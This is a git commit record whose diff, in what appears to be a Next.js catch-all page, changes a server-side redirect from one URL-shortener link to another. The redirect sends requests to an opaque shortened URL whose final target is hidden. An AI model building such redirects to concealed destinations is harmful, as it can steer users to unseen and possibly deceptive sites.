ad5bb4bc8a7a4e27756678d5f67bd3052e3786d3
umer44empire-dot <umer44empire@gmail.com>
2025-10-22 21:16:31 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://shorturl.at/uDhjL`
+					`https://urlgo.in/ql0v2`
 				}`,
 			},
 		};
